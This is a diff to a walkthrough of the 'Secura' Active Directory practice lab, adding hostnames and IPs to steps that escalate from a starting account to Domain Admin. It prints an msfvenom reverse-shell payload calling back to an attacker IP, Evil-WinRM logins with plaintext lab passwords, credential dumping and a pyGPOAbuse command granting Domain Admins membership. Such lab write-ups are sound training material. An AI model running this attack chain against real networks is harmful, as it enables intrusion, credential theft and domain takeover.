@@ -17,9 +17,10 @@ This is a walkthrough of the **Secura** Active Directory lab. It is an *assumed 
 | Item                    | Value                                  |
 | ----------------------- | -------------------------------------- |
 | Network range           | `192.168.216.0/24`                     |
-| VM1 — Domain Controller | `192.168.216.97`                       |
-| VM2 — workstation       | `192.168.216.96`                       |
-| VM3 — workstation       | `192.168.216.95`                       |
+| VM1 — Domain Controller | `192.168.216.97` (`DC01`)              |
+| VM2 — workstation       | `192.168.216.96` (`ERA`)               |
+| VM3 — workstation       | `192.168.216.95` (`SECURE`)            |
+| Attacker (Kali)         | `192.168.45.249`                       |
 | Starting account        | `Eric.Wallows` / `EricLikesRunning800` |
 
 ---
@@ -68,7 +69,7 @@ This is the **Domain Controller** for the `secura.yzx` domain, running Windows S
 
 ## 4.0 Enumeration — ManageEngine Applications Manager
 
-Section 3.1 found ManageEngine Applications Manager on port 8443. Now we dig into it.
+Section 3.1 found ManageEngine Applications Manager on port 8443, running on **VM3 (SECURE, 192.168.216.95)**. Now we dig into it.
 
 ### 4.1 Default Administrative Credentials
 
@@ -92,7 +93,7 @@ Once logged in, we found a **file upload** feature. It accepts **any file type**
 
 ### 5.1 Remote Code Execution via File Upload
 
-The upload feature from section 4.2 runs anything that lands in `working\`. To turn that into a shell, we built a Windows x64 reverse-shell payload with `msfvenom`:
+The upload feature from section 4.2 runs anything that lands in `working\`. To turn that into a shell, we built a Windows x64 reverse-shell payload with `msfvenom` on **Kali (192.168.45.249)**:
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.249 LPORT=1234 -f exe -o 1.exe
@@ -120,7 +121,7 @@ The connection came back and gave us a shell on `192.168.216.95` running as **`N
 
 ### 5.2 Post-Exploitation Enumeration with Evil-WinRM & WinPEAS
 
-For a stable, interactive shell, we logged in with Evil-WinRM using the given domain account:
+For a stable, interactive shell, we logged into **VM3 (SECURE, 192.168.216.95)** with Evil-WinRM using the given domain account:
 
 ```powershell
 evil-winrm -i 192.168.216.95 -u Eric.Wallows -p 'EricLikesRunning800'
@@ -186,7 +187,7 @@ Excerpt from `RDCMan.settings`:
 
 ### 6.2 Lateral Movement — the `apache` credential
 
-We used the `apache` password to log into `192.168.216.96` (hostname `era`) over WinRM:
+We used the `apache` password to move to the second machine — **ERA (192.168.216.96)** — over WinRM:
 
 ```bash
 evil-winrm -i 192.168.216.96 -u apache -p 'New2Era4.!'
@@ -202,7 +203,7 @@ WinRM (port 5985) is a remote management service, and Evil-WinRM turns it into a
 
 ### 7.1 Enumeration with PrivescCheck
 
-Now we are `era\apache` — a normal, low-level user. We need to find a way to run code as a more powerful account. Two tools help with that: **WinPEAS** and **PrivescCheck**.
+Now we are `era\apache` — a normal, low-level user on **ERA (192.168.216.96)**. We need to find a way to run code as a more powerful account. Two tools help with that: **WinPEAS** and **PrivescCheck**.
 
 ```powershell
 upload /home/kali/tools/PrivescCheck.ps1
@@ -296,7 +297,7 @@ era\administrator
 
 ## 8.0 Credential Dumping with secretsdump
 
-Now that we are Administrator on ERA, the next goal is to collect credentials that get us to the Domain Controller. Windows stores secrets in a few places:
+Now that we are Administrator on **ERA (192.168.216.96)**, the next goal is to collect credentials that get us to the Domain Controller. Windows stores secrets in a few places:
 
 - **SAM** — hashes of local accounts (like Administrator).
 - **LSA Secrets** — passwords of services that run as a specific account, stored in a recoverable form.
@@ -335,7 +336,7 @@ No cached domain logins on ERA, so this machine alone does not reach the domain 
 
 ### 9.1 charlotte's Credentials — from the MySQL creds table
 
-The credential dump in section 8.0 gave us local administrator credentials, but no path into the domain. We still had MySQL root access on ERA (from the UDF escalation in section 7.0), so we looked there and found a database called `creds` that does not exist in a standard XAMPP install:
+The credential dump in section 8.0 gave us local administrator credentials, but no path into the domain. We still had MySQL root access on **ERA (192.168.216.96)** (from the UDF escalation in section 7.0), so we looked there and found a database called `creds` that does not exist in a standard XAMPP install:
 
 ```powershell
 C:\xampp\mysql\bin\mysql.exe -u root -e "SHOW DATABASES;"
@@ -356,7 +357,7 @@ The `administrator` entry matched the password we had already recovered from LSA
 
 ### 9.2 GPO Abuse — charlotte to Domain Admins
 
-We tested charlotte's password against the Domain Controller and got a valid WinRM session:
+We tested charlotte's password against the **Domain Controller (DC01, 192.168.216.97)** and got a valid WinRM session:
 
 ```bash
 nxc smb 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
@@ -385,7 +386,7 @@ We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy.
 python3 pygpoabuse.py secura.yzx/charlotte:'Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" charlotte /add /domain' -dc-ip 192.168.216.97
 ```
 
-We then forced the policy to apply straight away (normally Group Policy refreshes on a timer, but we don't want to wait):
+We then forced the policy to apply straight away on **DC01 (192.168.216.97)** (normally Group Policy refreshes on a timer, but we don't want to wait):
 
 ```powershell
 gpupdate /force
